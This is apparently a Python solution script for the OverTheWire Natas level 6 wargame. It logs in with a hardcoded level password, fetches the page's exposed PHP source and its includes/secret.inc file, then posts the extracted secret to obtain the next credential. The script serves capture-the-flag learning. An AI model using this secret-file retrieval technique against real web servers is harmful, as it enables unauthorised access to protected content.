import requests
import bs4
import re
import html


# configuration for natas6
USERNAME = 'natas6'
PASSWORD = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
URL = 'http://natas6.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(URL)
soup = bs4.BeautifulSoup(response.text, 'html.parser')
div_content = soup.find('body').find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get source code
response = session.get(URL + 'index-source.html')
# the response contains the source code as encoded html file, e.g. &lt; which should've been <br
# therefore, we can use html.unescape() to decoded the html file
source = html.unescape(response.text).replace('<br />', '')
soup = bs4.BeautifulSoup(source, 'lxml')
div = soup.find('div').prettify()
print(f'{div}\n')


# as we can see from the source code, specifically from the php code,
# there is a filepath to includes/secret.inc
# let's find out the content of the file
response = session.get(URL + 'includes/secret.inc')
print(response.text)
# although the includes directory is properly protected with access control
# the file secret.inc is accessible


"""
From burpsuite:
secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query
"""
# therefore, we need to use both 'secret' and 'submit' as the keys to the data
# that we will send through the POST request
regex_search = re.search(r'\$(\w+) = "(\w+)";', response.text)
data = {
    regex_search.group(1) : regex_search.group(2),
    # submit accepts any value, here, I just simply follow the value used by burpsuite
    'submit' : 'Submit+Query'
}
response = session.post(URL, data=data)
print(response.text)